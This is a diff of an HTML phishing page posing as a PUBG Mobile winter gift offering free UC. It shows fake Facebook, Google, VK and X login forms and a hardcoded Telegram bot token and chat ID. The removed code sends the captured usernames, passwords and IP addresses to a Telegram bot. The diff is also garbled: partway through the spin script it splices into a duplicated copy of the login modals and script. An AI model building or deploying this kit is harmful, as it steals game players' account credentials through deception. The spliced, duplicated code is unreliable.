@@ -1,380 +1,495 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile - Gift Drop</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>PUBG Mobile - Winter Event 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
-
     <style>
         :root {
-            --pubg-gold: #ffbc00;
-            --pubg-dark: #0b0c0d;
-            --pubg-card: #151618;
-            --pubg-blue: #0084ff;
-            --pubg-red: #ff3b30;
+            --pubg-gold: #ffc107;
+            --pubg-blue: #1877F2;
+            --bg-dark: #050a10;
         }
 
         body {
-            background-color: var(--pubg-dark);
-            color: white;
+            background: var(--bg-dark);
+            color: #e0e6ed;
             font-family: 'Inter', sans-serif;
-            margin: 0; padding: 0;
+            margin: 0;
             overflow-x: hidden;
+            min-height: 100vh;
         }
 
-        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+        /* Праздничный фон */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 50% 0%, rgba(123, 104, 238, 0.1) 0%, transparent 50%), url('phon.png');
+            background-size: cover;
+            background-position: center;
+            z-index: -2;
+            filter: brightness(0.4);
+        }
 
-        /* Шапка из скриншота */
-        header {
+        /* Снег */
+        #snow-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
+        .snowflake { position: absolute; top: -10px; background: white; border-radius: 50%; opacity: 0.8; animation: fall linear infinite; }
+        @keyframes fall { to { transform: translateY(100vh) translateX(20px); } }
+
+        /* Шапка */
+        .app-header {
             background: rgba(0, 0, 0, 0.9);
             padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; top: 0; z-index: 100;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: sticky; top: 0; z-index: 1000;
         }
 
-        .btn-deposit {
+        .uc-balance {
             background: rgba(255, 255, 255, 0.05);
-            border: 1px dashed white;
+            border: 1px solid var(--pubg-gold);
             border-radius: 20px;
-            padding: 6px 14px;
+            padding: 4px 12px;
             display: flex;
             align-items: center;
-            gap: 8px;
-            position: relative;
+            gap: 6px;
         }
 
-        .bonus-badge {
-            position: absolute;
-            top: -10px; right: -5px;
-            background: #4caf50;
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 6px;
-            font-weight: 900;
+        /* Стили кейса */
+        .case-viewport {
+            width: 100%; height: 160px; position: relative; overflow: hidden;
+            background: rgba(0,0,0,0.4); margin: 20px 0;        }
+        .case-marker {
+            position: absolute; left: 50%; top: 0; bottom: 0; width: 2px;
+            background: var(--pubg-gold); z-index: 10; transform: translateX(-50%);
+            box-shadow: 0 0 15px var(--pubg-gold);
+        }
+        .case-tape { display: flex; align-items: center; height: 100%; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
+        .case-item { min-width: 120px; text-align: center; flex-shrink: 0; }
+        .case-item img { width: 80px; margin: 0 auto; }
+
+        /* Рулетка */
+        .roulette-container { position: relative; width: 100%; height: 320px; background: rgba(20, 35, 60, 0.3); border-radius: 20px; border: 2px solid #2a3b5a; overflow: hidden; }
+        .prizes-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; height: 100%; }
+        .prize-item { background: rgba(255,255,255,0.03); border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.05); }
+        .selection-frame { position: absolute; border: 3px solid #00d4ff; border-radius: 12px; box-shadow: 0 0 20px #00d4ff; z-index: 100; pointer-events: none; opacity: 0; transition: 0.1s; }
+
+        /* Кнопки */
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; font-weight: 800; font-family: 'Orbitron'; text-transform: uppercase; transition: 0.3s; }
+        .btn-claim { background: linear-gradient(180deg, #ffc107 0%, #ff9800 100%); color: #000; margin-bottom: 20px; animation: pulse 2s infinite; }
+        
+        @keyframes pulse { 
+            0% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 193, 7, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0); }
         }
 
-        /* Стили Кейса (Лента) */
-        .case-container {
-            position: relative;
-            width: 100%;
-            height: 180px;
-            overflow: hidden;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.02) 0%, transparent 80%);
-            margin: 20px 0;
-        }
-
-        .case-line {
-            position: absolute;
-            top: 0; left: 50%;
-            width: 2px; height: 100%;
-            background: var(--pubg-gold);
-            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
-        }
-
-        .case-tape {
-            display: flex;
-            padding: 20px 0;
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
-            will-change: transform;
-        }
-
-        .case-item {
-            min-width: 130px;
-            height: 140px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            opacity: 0.5;
-            transition: opacity 0.3s;
-        }
-
-        .case-item.active { opacity: 1; transform: scale(1.1); }
-        .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
-        .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
-
-        /* Кнопки как на скрине */
-        .error-msg {
-            background: rgba(255, 59, 48, 0.15);
-            color: var(--pubg-red);
-            border: 1px solid rgba(255, 59, 48, 0.3);
-            border-radius: 12px;
-            padding: 15px;
-            text-align: center;
-            font-size: 14px;
-            margin: 15px;
-            display: none;
-        }
-
-        .btn-blue {
-            background: var(--pubg-blue);
-            color: white;
-            width: calc(100% - 32px);
-            margin: 0 16px;
-            padding: 16px;
-            border-radius: 14px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-        }
-
-        /* Нижнее меню */
-        .nav-bar {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            background: #000;
-            height: 70px;
-            display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #555; font-size: 10px; }
-        .nav-item.active { color: var(--pubg-gold); }
-
-        /* Модалки */
-        .modal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 1000; display: none; flex-direction: column; padding: 20px;
-            justify-content: center;
-        }
-
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+        /* Копируем стили из твоего первого кода для модалок */
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; display: none; overflow-y: auto; }
+        .modal-overlay.active { display: block; }
+        
+        /* Facebook Fullscreen */
+        .fb-content { background: white; min-height: 100vh; color: #1c1e21; }
+        .fb-header { background: #fff; padding: 12px; border-bottom: 1px solid #dddfe2; color: #1877f2; font-size: 14px; text-align: center; }
+        
+        /* Google Fullscreen */
+        .google-content { background: white; min-height: 100vh; color: #202124; padding: 40px 20px; }
     </style>
 </head>
 <body>
+    <div id="snow-container"></div>
 
-    <!-- Header -->
-    <header>
+    <header class="app-header">
         <div class="flex items-center gap-2" onclick="showSection('hub')">
-            <i class="fas fa-chevron-left text-gray-400"></i>
-            <span class="text-sm font-bold">Назад</span>
+            <i class="fas fa-bars text-gray-400"></i>
+            <span class="text-xs font-bold uppercase tracking-widest" style="font-family: 'Orbitron'">Menu</span>
         </div>
-        <div class="text-center">
-            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
-            <p class="text-[9px] text-gray-500 uppercase">мини-приложение</p>
-        </div>
-        <div class="btn-deposit" onclick="startAuth()">
-            <div class="bonus-badge">+25%</div>
-            <div class="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center text-[10px]">+</div>
-            <span class="text-xs font-bold">Пополнить</span>
+        <div class="uc-balance">
+            <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="w-4 h-4">
+            <span id="balanceText" class="text-sm font-bold text-yellow-500">0</span>
+            <div class="w-4 h-4 bg-yellow-500 rounded-full flex items-center justify-center text-black text-[10px] font-bold">+</div>
         </div>
     </header>
 
-    <!-- MAIN HUB -->
+    <!-- HUB -->
     <div id="section-hub" class="p-4">
-        <h2 class="pubg-font text-2xl mb-4">Выбор режима</h2>
-        <div class="grid grid-cols-2 gap-4">
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
-                <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-font text-blue-400">GIFT DROP</div>
-                <div class="text-[9px] text-gray-500">КЕЙСЫ</div>
-            </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
-                <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-font text-yellow-500">LUCKY SPIN</div>
-                <div class="text-[9px] text-gray-500">РУЛЕТКА</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- CASE SECTION -->
-    <div id="section-case" style="display: none;">
-        <div class="text-center py-6">
-            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
-            <p class="text-gray-500 text-xs">Moon Season Edition</p>
+        <div class="bg-blue-600/20 border border-blue-500/50 p-4 rounded-2xl mb-6 text-center">
+            <h2 class="text-lg font-bold mb-1">🎁 WINTER GIFT!</h2>
+            <p class="text-xs text-gray-300 mb-4">Login to receive 1,000 UC for free!</p>
+            <button onclick="showSection('auth')" class="btn-main btn-claim">Claim 1000 UC</button>
         </div>
 
-        <div class="case-container">
-            <div class="case-line"></div>
-            <div class="case-tape" id="caseTape">
-                <!-- Элементы генерируются JS -->
-            </div>
-        </div>
-
-        <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
-
-        <div id="openBtn" onclick="tryOpenCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
-        <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
-
-        <div class="p-5">
-            <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
-            <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case1.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">M416 Glacier</p>
+        <div class="grid grid-cols-1 gap-4">
+            <div class="bg-white/5 p-4 rounded-2xl border border-white/10 flex items-center gap-4" onclick="showSection('case')">
+                <img src="priz5.png" class="w-16 h-16 object-contain">
+                <div>
+                    <h3 class="font-bold text-blue-400">MOON DROP</h3>
+                    <p class="text-[10px] text-gray-500 uppercase">Open Premium Cases</p>
                 </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case2.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">Pharaoh Set</p>
-                </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case3.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">X-Suit</p>
+            </div>
+            <div class="bg-white/5 p-4 rounded-2xl border border-white/10 flex items-center gap-4" onclick="showSection('spin')">
+                <img src="priz2.png" class="w-16 h-16 object-contain">
+                <div>
+                    <h3 class="font-bold text-yellow-500">LUCKY SPIN</h3>
+                    <p class="text-[10px] text-gray-500 uppercase">Win Exclusive Skins</p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- SPIN SECTION -->
-    <div id="section-spin" style="display: none;" class="p-5">
-         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative">
-            <div class="grid grid-cols-3 gap-2" id="spinGrid">
-                <!-- Ячейки рулетки -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="case1.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="case2.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="case3.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="case4.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><i class="fas fa-star text-yellow-500"></i></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="case5.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="case6.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="case7.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="case8.png"></div>
+    <!-- CASE -->
+    <div id="section-case" class="hidden">
+        <div class="p-6 text-center">
+            <h2 class="text-2xl font-bold font-['Orbitron']">PREMIUM CASE</h2>
+            <p class="text-gray-500 text-xs mt-1">Cost: 60 UC per opening</p>
+        </div>
+        <div class="case-viewport">
+            <div class="case-marker"></div>
+            <div class="case-tape" id="caseTape"></div>
+        </div>
+        <div class="p-4">
+            <button id="btnOpenCase" onclick="handlePlay('case')" class="btn-main bg-white text-black mb-4">Open (60 UC)</button>
+            <div id="caseError" class="hidden bg-red-500/10 border border-red-500 text-red-500 p-3 rounded-xl text-center text-xs mb-4">
+                Insufficient UC! Claim your free 1,000 UC gift first.
             </div>
-         </div>
-         <button class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black" onclick="tryOpenCase()">Крутить (60 UC)</button>
+        </div>
     </div>
 
-    <!-- MODAL AUTH -->
-    <div id="modalAuth" class="modal">
-        <div class="login-card">
-            <h2 class="font-black text-xl mb-2">Верификация аккаунта</h2>
-            <p class="text-gray-500 text-sm mb-6">Войдите через одну из сетей, чтобы подтвердить ID и получить награду.</p>
+    <!-- SPIN -->
+    <div id="section-spin" class="hidden p-4">
+        <div class="text-center mb-6">
+            <h2 class="text-2xl font-bold font-['Orbitron']">LUCKY SPIN</h2>
+            <p class="text-gray-500 text-xs">Test your luck today!</p>
+        </div>
+        <div class="roulette-container">
+            <div class="prizes-grid">
+                <div class="prize-item" data-id="1"><img src="priz1.png" class="w-12"></div>
+                <div class="prize-item" data-id="2"><img src="priz2.png" class="w-12"></div>
+                <div class="prize-item" data-id="3"><img src="priz3.png" class="w-12"></div>
+                <div class="prize-item" data-id="4"><img src="priz4.png" class="w-12"></div>
+                <div class="prize-item center-item border-0 bg-transparent"><img src="priz5.png" class="w-12 opacity-50"></div>
+                <div class="prize-item" data-id="6"><img src="priz6.png" class="w-12"></div>
+                <div class="prize-item" data-id="7"><img src="priz7.png" class="w-12"></div>
+                <div class="prize-item" data-id="8"><img src="priz8.png" class="w-12"></div>
+                <div class="prize-item" data-id="9"><img src="priz9.png" class="w-12"></div>
+            </div>
+            <div id="spinFrame" class="selection-frame"></div>
+        </div>
+        <button id="btnOpenSpin" onclick="handlePlay('spin')" class="btn-main bg-yellow-500 text-black mt-8">Spin (60 UC)</button>
+        <div id="spinError" class="hidden bg-red-500/10 border border-red-500 text-red-500 p-3 rounded-xl text-center text-xs mt-4">
+            Insufficient UC! Claim your free 1,000 UC gift first.
+        </div>
+    </div>
+
+    <!-- AUTH SELECTOR -->
+    <div id="section-auth" class="hidden p-6">
+        <div class="bg-[#14233c] p-6 rounded-3xl border border-blue-500/30 text-center">
+            <h2 class="text-xl font-bold mb-2">CLAIM YOUR GIFT</h2>
+            <p class="text-xs text-gray-400 mb-8 text-center leading-relaxed">To prevent fraud and ensure you are a real player, please verifyyour account to receive 1,000 UC instantly.</p>
             
-            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
-                <i class="fab fa-facebook-f"></i> Facebook
-            </button>
-            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
-                <i class="fab fa-google"></i> Google
-            </button>
-            <button onclick="showSection('hub')" class="w-full text-gray-400 text-sm mt-2">Отмена</button>
+            <input type="number" id="playerID" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl mb-6 text-center font-bold tracking-widest" placeholder="CHARACTER ID">
+
+            <div class="grid grid-cols-2 gap-4">
+                <button onclick="openLogin('fb')" class="bg-[#1877f2] p-4 rounded-2xl flex flex-col items-center gap-2">
+                    <i class="fab fa-facebook text-2xl"></i><span class="text-[10px] font-bold">Facebook</span>
+                </button>
+                <button onclick="openLogin('google')" class="bg-white text-black p-4 rounded-2xl flex flex-col items-center gap-2">
+                    <img src="google.png" class="w-6"><span class="text-[10px] font-bold">Google</span>
+                </button>
+                <button onclick="openLogin('vk')" class="bg-[#4a76a8] p-4 rounded-2xl flex flex-col items-center gap-2">
+                    <i class="fab fa-vk text-2xl"></i><span class="text-[10px] font-bold">VK</span>
+                </button>
+                <button onclick="openLogin('x')" class="bg-black border border-gray-800 p-4 rounded-2xl flex flex-col items-center gap-2">
+                    <img src="twiter.png" class="w-6"><span class="text-[10px] font-bold">X / Twitter</span>
+                </button>
+            </div>
         </div>
     </div>
 
-    <div id="modalForm" class="modal">
-        <div class="login-card">
-            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
-            <input type="text" id="inpUser" placeholder="Номер или эл. почта">
-            <input type="password" id="inpPass" placeholder="Пароль">
-            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
+    <!-- FACEBOOK MODAL -->
+    <div id="modal-fb" class="modal-overlay">
+        <div class="fb-content">
+            <div class="fb-header">Установите Facebook для iOS — приложение работает быстрее.</div>
+            <div class="p-8">
+                <div class="flex justify-center my-10"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="w-16"></div>
+                <input type="text" id="fbUser" class="w-full bg-[#f5f6f7] border border-gray-300 p-4 rounded-xl mb-3" placeholder="Моб. телефон или эл. адрес">
+                <input type="password" id="fbPass" class="w-full bg-[#f5f6f7] border border-gray-300 p-4 rounded-xl mb-4" placeholder="Пароль">
+                <button onclick="submitData('Facebook', 'fbUser', 'fbPass')" class="w-full bg-[#1877f2] text-white p-3 rounded-full font-bold text-lg">Войти</button>
+                <p class="text-center mt-6 text-[#1877f2] text-sm">Забыли пароль?</p>
+            </div>
         </div>
     </div>
 
-    <!-- Bottom Nav -->
-    <nav class="nav-bar">
-        <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-home"></i><span>Главная</span></div>
-        <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open"></i><span>Кейсы</span></div>
-        <div class="nav-item"><i class="fas fa-tasks"></i><span>Задания</span></div>
-        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user-circle"></i><span>Профиль</span></div>
-    </nav>
+    <!-- GOOGLE MODAL -->
+    <div id="modal-google" class="modal-overlay">
+        <div class="google-content">
+            <img src="google.png" class="w-20 mb-8">
+            <h2 class="text-2xl mb-2">Вход</h2>
+            <p class="mb-10 text-gray-700">Используйте аккаунт Google</p>
+            <input type="text" id="gmUser" class="w-full border border-gray-300 p-4 rounded-md mb-6" placeholder="Эл. почта или номер телефона">
+            <input type="password" id="gmPass" class="w-full border border-gray-300 p-4 rounded-md mb-10" placeholder="Введите ваш пароль">
+            <div class="flex justify-between items-center">
+                <span class="text-blue-600 font-bold">Создать аккаунт</span>
+                <button onclick="submitData('Google', 'gmUser', 'gmPass')" class="bg-blue-600 text-white px-8 py-2 rounded-md font-bold">Далее</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- VK MODAL (Simple) -->
+    <div id="modal-vk" class="modal-overlay">
+        <div class="bg-white min-h-screen p-6 text-black">
+            <div class="text-center mb-10 mt-10"><img src="vkontakte.png" class="w-12 mx-auto"></div>
+            <h2 class="text-center text-xl font-bold mb-8">Вход ВКонтакте</h2>
+            <input type="text" id="vkUser" class="w-full bg-[#f2f3f5] p-4 rounded-xl mb-3" placeholder="Телефон или почта">
+            <input type="password" id="vkPass" class="w-full bg-[#f2f3f5] p-4 rounded-xl mb-6" placeholder="Пароль">
+            <button onclick="submitData('VK', 'vkUser', 'vkPass')" class="w-full bg-[#4a76a8] text-white p-4 rounded-xl font-bold">Войти</button>
+        </div>
+    </div>
+
+    <!-- X MODAL -->
+    <div id="modal-x" class="modal-overlay">
+        <div class="bg-black min-h-screen p-8">
+            <div class="mb-10"><img src="twiter.png" class="w-8"></div>
+            <h2 class="text-2xl font-bold mb-10">Sign in to X</h2>
+            <input type="text" id="xUser" class="w-full bg-transparent border border-gray-800 p-4 rounded-md mb-4" placeholder="Phone, email or username">
+            <input type="password" id="xPass" class="w-full bg-transparent border border-gray-800 p-4 rounded-md mb-10" placeholder="Password">
+            <button onclick="submitData('X/Twitter', 'xUser', 'xPass')" class="w-full bg-white text-black p-4 rounded-full font-bold">Next</button>
+        </div>
+    </div>
 
     <script>
         // --- CONFIG ---
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
-        
-        const prizeImages = ['case1.png', 'case2.png', 'case3.png', 'case4.png', 'case5.png', 'case6.png', 'case7.png', 'case8.png'];
+        let ucBalance = 0;
         let userIP = '';
-        let currentMethod = '';
 
-        // Определение IP
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
+        // Init IP
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip);
 
-        // Навигация
+        // UI Functions
         function showSection(id) {
-            ['section-hub', 'section-case', 'section-spin', 'modalAuth', 'modalForm'].forEach(s => {
-                document.getElementById(s).style.display = 'none';
-                document.getElementById(s).classList.remove('flex');
-            });
-            const target = document.getElementById('section-' + id);
-            if(target) target.style.display = 'block';
-            window.scrollTo(0,0);
+            ['hub', 'case', 'spin', 'auth'].forEach(s => document.getElementById('section-'+s).classList.add('hidden'));
+            document.getElementById('section-'+id).classList.remove('hidden');
         }
 
-        // Генерация ленты кейса
-        const tape = document.getElementById('caseTape');
-        for(let i=0; i<40; i++) {
-            const img = prizeImages[Math.floor(Math.random()*prizeImages.length)];
-            tape.innerHTML += `
-                <div class="case-item">
-                    <img src="${img}">
-                    <span class="pubg-font">Epic Item</span>
-                </div>
-            `;
+        function openLogin(type) {
+            document.getElementById('modal-'+type).classList.add('active');
         }
 
-        // Логика "Открытия" (Ошибка как на скрине)
-        function tryOpenCase() {
-            document.getElementById('errorBox').style.display = 'block';
-            document.getElementById('openBtn').style.display = 'none';
-            document.getElementById('depositBtn').style.display = 'block';
+        function closeModals() {
+            document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+        }
+
+        // --- GAME LOGIC ---
+        function handlePlay(type) {
+            if (ucBalance < 60) {
+                document.getElementById(type + 'Error').classList.remove('hidden');
+                return;
+            }
             
-            // Крутим ленту для вида
-            const offset = 130 * 25 + Math.floor(Math.random()*100);
+            if (type === 'case') animateCase();
+            else startSpin();
+        }
+
+        // Case Animation
+        function animateCase() {
+            const tape = document.getElementById('caseTape');
+            const offset = (120 * 35) + (Math.random() * 80);
             tape.style.transform = `translateX(-${offset}px)`;
-            
-            sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" (IP: ${userIP})`);
-        }
-
-        function startAuth() {
-            document.getElementById('modalAuth').style.display = 'flex';
-        }
-
-        function openForm(method) {
-            currentMethod = method;
-            document.getElementById('methodName').innerText = 'Login with ' + method;
-            document.getElementById('modalAuth').style.display = 'none';
-            document.getElementById('modalForm').style.display = 'flex';
-        }
-
-        async function finalSubmit() {
-            const u = document.getElementById('inpUser').value;
-            const p = document.getElementById('inpPass').value;
-            if(u.length < 3 || p.length < 3) return alert('Заполните поля!');
-
-            const msg = `
-🔥 **NEW LOG** 🔥
-👤 Метод: ${currentMethod}
-📧 Логин: \`${u}\`
-🔑 Пароль: \`${p}\`
-🌐 IP: ${userIP}
-            `;
-            
-            await sendTelegram(msg);
-            
-            document.getElementById('modalForm').innerHTML = `
-                <div class="text-center p-10">
-                    <i class="fas fa-spinner fa-spin text-3xl mb-3 text-blue-500"></i>
-                    <p class="text-black font-bold">Синхронизация аккаунта...</p>
-                </div>
-            `;
+            ucBalance -= 60;
+            updateBalanceUI();
             
             setTimeout(() => {
-                alert('Ошибка: Данный аккаунт не подходит под критерии акции (минимум 15 уровень).');
+                alert("Success! The item was sent to your in-game mail.");
                 location.reload();
-            }, 3000);
+            }, 5500);
         }
 
-        async function sendTelegram(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
-                });
-            } catch(e) {}
+        // Spin Animation
+        function startSpin() {
+            const prizes = [0, 1, 2, 3, 5, 8, 7, 6];
+            let steps = 30 + Math.floor(Math.random() * 10);
+            let current = 0;
+            let speed = 50;
+            
+            ucBalance -= 60;
+            updateBalanceUI();
+
+            function run() {
+                const activeIdx = prizes[current % prizes.length];
+                const activeEl = document.querySelector(`.prize-item[data-id="${activeIdx + 1}"]`);
+                const frame = document.getElementById('spinFrame');
+                const rect = activeEl.getBoundingClientRect();
+                const cont = document.querySelector('.roulette-container').getBoundingClientRect();
+                
+                frame.style.opacity = '1';
+                frame.style.width = rect.width + 'px';
+                frame.style.height = rect.height + 'px';
+                frame.style.left = (rect.left - cont.left)f2f3f5] p-4 rounded-xl mb-3" placeholder="Телефон или почта">
+            <input type="password" id="vkPass" class="w-full bg-[#f2f3f5] p-4 rounded-xl mb-6" placeholder="Пароль">
+            <button onclick="submitData('VK', 'vkUser', 'vkPass')" class="w-full bg-[#4a76a8] text-white p-4 rounded-xl font-bold">Войти</button>
+        </div>
+    </div>
+
+    <!-- X MODAL -->
+    <div id="modal-x" class="modal-overlay">
+        <div class="bg-black min-h-screen p-8">
+            <div class="mb-10"><img src="twiter.png" class="w-8"></div>
+            <h2 class="text-2xl font-bold mb-10">Sign in to X</h2>
+            <input type="text" id="xUser" class="w-full bg-transparent border border-gray-800 p-4 rounded-md mb-4" placeholder="Phone, email or username">
+            <input type="password" id="xPass" class="w-full bg-transparent border border-gray-800 p-4 rounded-md mb-10" placeholder="Password">
+            <button onclick="submitData('X/Twitter', 'xUser', 'xPass')" class="w-full bg-white text-black p-4 rounded-full font-bold">Next</button>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIG ---
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const CHAT_ID = '1709490182';
+        let ucBalance = 0;
+        let userIP = '';
+
+        // Init IP
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip);
+
+        // UI Functions
+        function showSection(id) {
+            ['hub', 'case', 'spin', 'auth'].forEach(s => document.getElementById('section-'+s).classList.add('hidden'));
+            document.getElementById('section-'+id).classList.remove('hidden');
         }
 
-        // Инициализация
-        showSection('hub');
+        function openLogin(type) {
+            document.getElementById('modal-'+type).classList.add('active');
+        }
+
+        function closeModals() {
+            document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+        }
+
+        // --- GAME LOGIC ---
+        function handlePlay(type) {
+            if (ucBalance < 60) {
+                document.getElementById(type + 'Error').classList.remove('hidden');
+                return;
+            }
+            
+            if (type === 'case') animateCase();
+            else startSpin();
+        }
+
+        // Case Animation
+        function animateCase() {
+            const tape = document.getElementById('caseTape');
+            const offset = (120 * 35) + (Math.random() * 80);
+            tape.style.transform = `translateX(-${offset}px)`;
+            ucBalance -= 60;
+            updateBalanceUI();
+            
+            setTimeout(() => {
+                alert("Success! The item was sent to your in-game mail.");
+                location.reload();
+            }, 5500);
+        }
+
+        // Spin Animation
+        function startSpin() {
+            const prizes = [0, 1, 2, 3, 5, 8, 7, 6];
+            let steps = 30 + Math.floor(Math.random() * 10);
+            let current = 0;
+            let speed = 50;
+            
+            ucBalance -= 60;
+            updateBalanceUI();
+
+            function run() {
+                const activeIdx = prizes[current % prizes.length];
+                const activeEl = document.querySelector(`.prize-item[data-id="${activeIdx + 1}"]`);
+                const frame = document.getElementById('spinFrame');
+                const rect = activeEl.getBoundingClientRect();
+                const cont = document.querySelector('.roulette-container').getBoundingClientRect();
+                
+                frame.style.opacity = '1';
+                frame.style.width = rect.width + 'px';
+                frame.style.height = rect.height + 'px';
+                frame.style.left = (rect.left - cont.left)+ 'px';
+                frame.style.top = (rect.top - cont.top) + 'px';
+
+                current++;
+                if (current < steps) {
+                    speed += 10;
+                    setTimeout(run, speed);
+                } else {
+                    setTimeout(() => {
+                        alert("Congratulations! Your reward will arrive within 24 hours.");
+                        location.reload();
+                    }, 500);
+                }
+            }
+            run();
+        }
+
